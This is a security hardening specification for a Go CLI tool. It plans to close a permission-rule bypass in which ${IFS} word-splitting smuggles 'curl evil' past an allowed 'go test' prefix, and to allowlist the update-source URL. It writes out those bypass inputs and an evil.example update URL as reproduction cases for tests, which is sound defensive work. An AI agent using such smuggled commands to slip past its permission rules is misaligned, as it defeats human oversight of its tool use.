---
id: SPEC-SEC-HARDEN-005
title: "SEC-HARDEN §F residual containment — ${IFS} shell-aware word-split + update env-trust allowlist"
version: "0.1.0"
status: in-progress
created: 2026-06-14
updated: 2026-06-14
author: manager-spec
priority: P1
phase: "v3.0.0"
module: "internal/permission, internal/cli"
lifecycle: spec-anchored
tags: "security, permission, shell-injection, env-trust, sec-harden, containment"
era: V3R6
tier: M
---

# SPEC-SEC-HARDEN-005 — SEC-HARDEN §F residual containment

## HISTORY

| Version | Date | Author | Change |
|---------|------|--------|--------|
| 0.1.0 | 2026-06-14 | manager-spec | 초안 — SEC-HARDEN-002 §F.1(${IFS}) + §F.2(env-trust) 이연 항목 봉쇄. mvdan.cc/sh 신규 의존성 도입(§F.1), update env scheme+host allowlist(§F.2), TOCTOU godoc OPTIONAL note(§F.3 비요구). |

## A. 배경 (Context)

본 SPEC은 SEC-HARDEN 라인(001/002/003/004 — 전부 `completed`, era V3R6)의 **fast-follow**다. SEC-HARDEN-002 §F.1/§F.2에서 의존성·위협모델 종속으로 명시 이연된 두 잔여 결함을 봉쇄한다. SEC-HARDEN-004 sync-audit(2026-06-14) §INFO는 본 두 클래스가 "honestly scoped future SPECs"로 정직하게 이연되었음을 독립 확인했다.

이 SPEC은 두 개의 실제 수정 표면과 하나의 OPTIONAL godoc 항목을 다룬다:

1. **§F.1 (PRIMARY, 신규 의존성)** — `internal/permission/stack.go`의 `hasUnquotedShellSeparator` 어휘 스캔이 잡지 못하는 `${IFS}` 셸 word-split 우회. **`mvdan.cc/sh/v3/syntax`** shell-aware 파서를 신규 직접 go.mod 의존성으로 도입하여 봉쇄.
2. **§F.2 (PRIMARY)** — `internal/cli/deps.go`의 `moai update` source env 3종(`MOAI_UPDATE_SOURCE`/`MOAI_UPDATE_URL`/`MOAI_RELEASES_DIR`)에 scheme+host allowlist 부재. 신뢰 불가 env로 update source를 적대적 URL로 돌려 바이너리-다운로드 RCE 경로 형성 가능.
3. **§F.3 (OPTIONAL, 비요구)** — `restoreTargetContained`/`parentChainContained`/`runMXScan`의 check-vs-use(TOCTOU) 윈도. **요구사항이 아니며**, 선례(SEC-HARDEN-003/004 §F.1)와 동일하게 OPTIONAL godoc note만 둔다. 코드 동작 변경 없음.

### A.1 Ground-truth 검증 (본 plan-phase 확인)

- **§F.1 취약점 실재**: `Bash(go test:*)` 룰 + `go test ${IFS}curl${IFS}evil` 입력 → 현재 ALLOW로 해소된다. `${IFS}`는 리터럴 separator 문자(`;`/`&&`/`||`/`|`/`$(`/backtick/`>`/`<`/newline)를 포함하지 않으므로 `hasUnquotedShellSeparator`(stack.go:172)의 어휘 스캔을 통과한다. word-split은 셸 expansion 시점에 일어난다(`${IFS}`는 공백으로 확장 → `curl evil`이 별개 명령/인자로 탑승).
- **$-blacklist는 기각됨**: SEC-HARDEN-002 §F.1이 명시적으로 거부. `$HOME`/`${HOME}`/`TestX$`(9개 정상 샘플 중 4개)를 false-deny 한다. 본 SPEC은 $-blacklist 해킹을 **출하하지 않는다**.
- **§F.2 취약점 실재**: `internal/cli/deps.go` L260-285 — `os.Getenv(EnvUpdateSource)`/`os.Getenv(EnvReleasesDir)`/`os.Getenv(EnvUpdateURL)`이 scheme+host 검증 없이 update source/URL/local dir를 결정한다. canonical 기본 host는 `api.github.com`(`githubReleasesURL = "https://api.github.com/repos/modu-ai/moai-adk/releases"`, deps.go:32).
- **TOCTOU 선례**: SEC-HARDEN-003/004 §F.1 모두 `moai update`의 offline single-process 위협모델(사용자 자기 머신 단일 프로세스)에서 auditor-accepted된 godoc-only 처리. 본 SPEC도 동일.

## B. 위협 모델 (Threat Model)

### B.1 §F.1 — `${IFS}` word-split command-chain 우회

- **공격자 영향 가능 입력**: permission 룰 매칭 대상인 Bash 입력 문자열(LLM 또는 상위 프롬프트 경유 도구 호출).
- **현재 봉쇄(어휘 스캔)의 한계**: `hasUnquotedShellSeparator`는 리터럴 separator 문자만 스캔한다. `${IFS}`/`$IFS`는 어떤 separator 문자도 포함하지 않으므로 통과 → `:*` prefix 룰이 chained 명령을 silently ALLOW.
- **결과**: allow-listed prefix(`go test`)에 편승하여 임의 명령(`curl evil`)이 실행되는 command-chain 우회. SEC-HARDEN-001 M1이 닫으려던 클래스의 같은 부류 잔존 hole.
- **봉쇄 후 불변식**: word-split을 유발할 수 있는 unquoted `${IFS}`/`$IFS` 파라미터 확장이 prefix remainder에 존재하면 prefix 룰은 **비매칭**(deny path로 fall-through)되어야 한다.

### B.2 §F.2 — update source env-trust

- **공격자 영향 가능 입력**: `MOAI_UPDATE_URL`/`MOAI_RELEASES_DIR`/`MOAI_UPDATE_SOURCE` 환경변수(악성 셸 프로파일, 침해된 CI 등으로 설정 가능).
- **현재 한계**: scheme+host allowlist 부재. 원격 update URL이 임의 host를 가리켜도 검증되지 않으며, 로컬 source의 releases dir도 경로 검증 없이 사용된다.
- **결과**: update source를 적대적 URL로 유도하여 악성 바이너리 다운로드 → RCE 경로.
- **봉쇄 후 불변식**: 원격 source의 URL은 scheme이 `https`여야 하고 host가 allowlist에 있어야 한다. 허용되지 않는 scheme/host는 fail-closed(거부). local source의 releases dir는 URL이 아닌 실제 로컬 경로여야 한다.

### B.3 §F.3 — TOCTOU check-vs-use (OPTIONAL, 비요구)

- check(`restoreTargetContained`의 containment 검사) 시점과 use(`os.WriteFile`/`os.MkdirAll`/`ReadFile`) 시점 사이의 race 윈도.
- **위협모델**: `moai update`/hook 스캔은 사용자 자기 머신의 단일 프로세스. 동시 적대적 프로세스가 race를 이기는 시나리오는 offline single-process 위협모델 밖.
- **처리**: SEC-HARDEN-003/004 §F.1 선례를 따라 godoc note로 race 윈도만 문서화. **코드 동작 변경 없음, AC로 게이트하지 않음.**

## C. 요구사항 (GEARS Requirements)

### C.1 §F.1 — `${IFS}` shell-aware word-split 봉쇄

- **REQ-SEC5-001** (Ubiquitous): The permission matcher **shall** detect `${IFS}`/`$IFS`-driven word-splitting in a `:*` prefix-rule remainder using a shell-aware parser, treating such input as a command-chain boundary (non-match).
- **REQ-SEC5-002** (Event-driven): **When** the matcher evaluates a `:*` prefix allow-rule remainder that contains an unquoted `${IFS}`/`$IFS` parameter expansion introducing word-split potential, the matcher **shall** report no match so the input falls through to the normal ask/deny path.
- **REQ-SEC5-003** (Ubiquitous): The `${IFS}` containment **shall** be implemented with the `mvdan.cc/sh/v3/syntax` parser added as a NEW direct go.mod dependency; the matcher **shall not** ship a `$`-blacklist heuristic.
- **REQ-SEC5-004** (Event-driven): **When** the shell-aware parser fails to parse the candidate input (malformed shell), the matcher **shall** fail-closed — report no match (deny path) rather than allow.
- **REQ-SEC5-005** (Ubiquitous): The existing lexical `hasUnquotedShellSeparator` guard **shall** be preserved; all SEC-HARDEN-001 M1 + SEC-HARDEN-002 M4 separators (`;`, `&&`, `||`, `|`, `$(...)`, backtick, newline, `>`, `<`, unterminated-quote-then-separator) **shall** continue to DENY (no regression).
- **REQ-SEC5-006** (Ubiquitous): The matcher **shall not** false-deny legitimate inputs that contain `$`/`${...}` without word-split intent — `$HOME`, `${HOME}`, `TestX$`, and the SEC-HARDEN-002 9-sample legit set **shall** stay ALLOW where they were ALLOW pre-fix.

### C.2 §F.2 — update env-trust allowlist

- **REQ-SEC5-007** (Ubiquitous): The update-dependency initializer **shall** validate the scheme and host of the remote update URL derived from `MOAI_UPDATE_URL` against an allowlist before constructing the remote update checker.
- **REQ-SEC5-008** (Event-driven): **When** the remote update URL scheme is not `https` OR the host is not on the allowlist, the initializer **shall** fail-closed — reject with a structured error and **shall not** construct an update checker pointed at the disallowed source.
- **REQ-SEC5-009** (Event-driven): **When** `MOAI_UPDATE_SOURCE` is `local`, the initializer **shall** validate that the `MOAI_RELEASES_DIR` value is a local filesystem path (not a URL), rejecting a URL-shaped releases dir fail-closed.
- **REQ-SEC5-010** (Ubiquitous): The allowlist **shall** admit the canonical default GitHub releases host (`api.github.com`, the host of `githubReleasesURL`); the default (no env override) update path **shall** continue to function unchanged (no regression).
- **REQ-SEC5-011** (Ubiquitous): The env-trust validation **shall** be scoped to exactly the three update-related env vars (`MOAI_UPDATE_SOURCE`, `MOAI_UPDATE_URL`, `MOAI_RELEASES_DIR`); it **shall not** extend to `.env.glm`, WSL2-PATH, or other env surfaces.

### C.3 §F.3 — TOCTOU OPTIONAL godoc (비요구 — NOT a requirement)

- **OPT-SEC5-001** (OPTIONAL, non-gating): The `restoreTargetContained` / `parentChainContained` / `runMXScan` godoc **may** document the check-vs-use (TOCTOU) race window and note it is out of scope under the offline single-process threat model. This is an OPTIONAL note, NOT an acceptance criterion; it introduces **no code behavior change** and does **not** gate implementation.

### C.4 비기능 요구 (NFR)

- **NFR-SEC5-001**: 모든 봉쇄 거부는 fail-closed(거부·비매칭 + 필요 시 구조화 에러)이며 panic 하지 않는다.
- **NFR-SEC5-002**: 크로스 플랫폼 — linux/darwin/windows 빌드 통과(`GOOS=windows GOARCH=amd64 go build ./...` exit 0). `mvdan.cc/sh/v3/syntax`는 pure-Go이며 cross-platform 안전.
- **NFR-SEC5-003**: 변경 패키지(`internal/permission`, `internal/cli`)의 테스트 커버리지는 변경 전 대비 회귀하지 않는다(language go.md ≥85% 목표; 절대치 아닌 no-regression).
- **NFR-SEC5-004**: 하드코딩 금지 — allowlist host/scheme 상수는 `const`로 추출(`internal/cli` 또는 `internal/config`); env var 명은 기존 `internal/config/envkeys.go` 상수 참조.
- **NFR-SEC5-005**: anti-over-engineering — 새 추상화/새 패키지/새 플래그 표면 도입 금지(예외: `mvdan.cc/sh` 의존성 + env-allowlist 검증 로직). §F.1 수정은 `hasUnquotedShellSeparator` 내부/인접, §F.2 수정은 `deps.go` env-read 블록 내부/인접.

## D. 검증 접근 (Verification Approach)

- **§F.1 재현 AC**: `Bash(go test:*)` 룰 + `go test ${IFS}curl${IFS}evil`(및 `$IFS` 변형) → 픽스 전 ALLOW(RED 입증), 픽스 후 DENY. 표 기반 `Matches`/word-split helper 테스트.
- **§F.1 회귀 AC**: SEC-HARDEN-001 M1 + SEC-HARDEN-002 M4 separator 스위트 전체 + D1 unterminated-quote 케이스 green 유지. 정상 `$HOME`/`${HOME}`/`TestX$` ALLOW 유지.
- **§F.1 fail-closed AC**: malformed shell 입력 → 파서 실패 → DENY(allow 아님).
- **§F.2 재현 AC**: `MOAI_UPDATE_URL=http://evil.example/...`(non-https) 및 disallowed-host https → 픽스 전 update checker 구성(RED), 픽스 후 fail-closed 거부. `MOAI_RELEASES_DIR`가 URL-shaped → 거부.
- **§F.2 회귀 AC**: env 미설정 default 경로 → `api.github.com` allowlist 통과, update checker 정상 구성(no regression).
- **의존성 검증**: `go.mod`에 `mvdan.cc/sh/v3` 직접 의존성 추가, `go mod tidy` 후 `go build ./...` 통과.

## E. 선행·후속 (Predecessors / Successors)

- 선행: SPEC-SEC-HARDEN-001 / 002 / 003 / 004 (전부 `completed`).
- 후속 후보: 없음(본 SPEC이 SEC-HARDEN §F primary 잔여 클래스 종결). 추가 LOW defense-in-depth(SEC-HARDEN-002 §F.3의 10 LOW findings)는 별도 판단.

## F. Exclusions (What NOT to Build)

[HARD] 다음은 본 SPEC 범위 밖이다. Tier M 외과적 범위 유지를 위해 명시 제외한다.

### F.1 Out of Scope — TOCTOU 코드 봉쇄 (OPTIONAL godoc만)

- TOCTOU check-vs-use race의 **코드 동작 변경**(파일 핸들 기반 재검사, `O_NOFOLLOW`, lock 등)은 본 SPEC 범위 밖. offline single-process 위협모델에서 SEC-HARDEN-003/004 §F.1과 동일하게 godoc note만 둔다(OPT-SEC5-001, 비요구).

### F.2 Out of Scope — env-trust 범위 확장

- `.env.glm` source-as-RCE-primitive, WSL2 PATH passthrough 등 SEC-HARDEN-002 §F.3 LOW findings는 본 SPEC 범위 밖. env-trust 검증은 update source 3종 env(`MOAI_UPDATE_SOURCE`/`MOAI_UPDATE_URL`/`MOAI_RELEASES_DIR`)로 한정한다(REQ-SEC5-011).
- 전체 `--path` 플래그 traversal 정책(SEC-HARDEN-002 §F.2) — 별도.

### F.3 Out of Scope — 광범위 리팩토링·추상화

- permission resolver 아키텍처, update orchestrator, deps 초기화 흐름의 리팩토링 금지. §F.1은 `hasUnquotedShellSeparator` 내부/인접 봉쇄 가드만, §F.2는 `deps.go` env-read 블록 내부/인접 검증만 추가한다(NFR-SEC5-005).
- `$`-blacklist 어휘 해킹 출하 금지(REQ-SEC5-003) — `mvdan.cc/sh` shell-aware 파서가 invariant-conformant 픽스.
- `internal/update` 바이너리 다운로드/무결성 검증 자체 변경 — 별도 패키지 그룹, 범위 밖(§F.2 검증은 source 결정 경계까지만).

### F.4 Out of Scope — 구현 세부 결정(run-phase 위임)

- `mvdan.cc/sh` 파서 헬퍼의 정확한 배치(새 파일 vs `stack.go` 인접) — `hasUnquotedShellSeparator`와 동일 패키지 내 사적 헬퍼라는 제약 하에 run-phase 결정.
- env-allowlist host 상수의 정확한 위치(`internal/cli` 사적 const vs `internal/config`) — `const` 추출 제약 하에 run-phase 결정.
- 파서 인스턴스 재사용(per-call `NewParser` vs package-level) — 동시성 안전 제약 하에 run-phase 결정.

### F.5 Out of Scope — 잘못된 전제(framing corrections)

- statusline은 셸 실행 sink가 아니다 — 본 SPEC은 statusline 관련 주장 없음.
- `internal/merge`/`internal/mx`는 범위 밖 — 본 SPEC은 permission 매처와 cli env-trust만 다룬다.
